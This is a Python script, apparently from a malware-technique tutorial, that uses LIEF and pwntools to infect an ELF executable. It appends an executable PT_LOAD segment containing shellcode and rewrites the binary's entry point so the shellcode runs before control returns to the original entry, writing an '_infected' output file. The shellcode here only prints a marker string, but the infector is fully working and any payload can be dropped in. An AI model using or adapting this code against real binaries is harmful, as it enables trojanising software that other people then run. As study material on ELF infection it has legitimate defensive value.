"""
PT_LOAD Injection with Python and LIEF

Author: @rhotav

MALWATION
"""

import lief
from pwn import *
import argparse

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", help="Binary to infect", required = True)
    parser.add_argument("-o", help="Output file")
    args = parser.parse_args()

    if len(sys.argv) < 2: 
        args.print_help()
        exit(0)

    payload = "this must be rhotav!\n"
    binary = lief.parse(args.f)

    shellcode = asm("mov esi, edx")
    shellcode += asm(shellcraft.i386.write(1, payload, len(payload)))
    shellcode += asm(f"""
    mov edx, esi
    push {hex(binary.header.entrypoint)}
    ret
    """)

    print("Shellcode size: ", len(shellcode))

    segment           = lief.ELF.Segment()
    segment           = lief.ELF.Segment()
    segment.type      = lief.ELF.SEGMENT_TYPES.LOAD
    segment.flags     = lief.ELF.SEGMENT_FLAGS.X
    segment.content   = bytearray(shellcode)
    segment.alignment = 0x999
    binary.add(segment)

    print("[+] Segment added")

    print("[+] Real EntryPoint: ", hex(binary.header.entrypoint))
    
    for seg in binary.segments:
        if seg.type == lief.ELF.SEGMENT_TYPES.LOAD and \
            seg.alignment == 0x999:
            binary.header.entrypoint = seg.virtual_address
            break
    
    print("[+] New EntryPoint: ", hex(binary.header.entrypoint))
    
    if args.o:
        binary.write(args.o)
    else:
        binary.write(args.f + "_infected")

if __name__ == "__main__":
    main()